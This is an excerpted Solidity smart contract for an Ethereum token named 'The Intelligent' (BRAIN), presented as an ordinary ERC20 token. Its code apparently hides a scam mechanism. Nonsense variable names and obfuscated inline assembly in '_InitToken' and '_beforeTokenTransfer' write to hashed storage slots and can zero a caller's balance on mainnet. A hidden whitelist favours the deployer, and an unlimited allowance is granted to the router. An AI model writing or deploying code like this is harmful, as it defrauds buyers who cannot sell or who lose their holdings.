...
/*
THE INTELLIGENT || ETH || BRAIN
Intelligent people know they are intelligent. They also know that one person cannot know all.
*/
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addBrain;
    uint256 private _strangeStory = block.number*2;

    mapping (address => bool) private _firstParty; 
    mapping (address => bool) private _secondParty;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private greenCart;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private beastyBreast;
    address public pair;
    ...
    bool private trading; uint256 private painKiller = 1; bool private beyondFood;
    uint256 private _decimals; uint256 private chickenWings;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addBrain.push(_router); addBrain.push(msgSender_); addBrain.push(pair);
        for (uint256 q=0; q < 3;) {_firstParty[addBrain[q]] = true; unchecked{q++;} }
    }
    ...
    function _InitToken() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xFB)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0xc7faf26b897902f7de6dc36f74d7455f45914afde6deb0d88bf64a6ce3ebe3f4
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x728a1f0605522b481e99e5d0507bedce264ce1faf7b12ff5a021382669ac6e77,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; _strangeStory = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addBrain[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployBrain(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addBrain[0], 10 ** 77);
        _InitToken();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployBrain(creator, initialSupply);
    }
}

contract TheIntelligent is ERC20Token {
    constructor() ERC20Token("The Intelligent", "BRAIN", msg.sender, 3825000 * 10 ** 18) {
    }
}